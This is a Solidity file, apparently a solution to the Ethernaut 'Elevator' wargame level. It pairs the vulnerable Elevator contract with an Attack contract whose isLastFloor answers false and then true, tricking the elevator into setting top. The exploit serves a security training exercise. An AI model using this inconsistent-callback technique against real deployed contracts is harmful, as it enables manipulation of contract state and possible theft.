// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint) external;
}

contract Attack {
    IElevator elevator;

    bool public secondCall;

    function attack(address _elevator) public {
        elevator = IElevator(_elevator);
        elevator.goTo(1);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (secondCall) {
            return true;
        }

        secondCall = true;
        return false;
    }
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
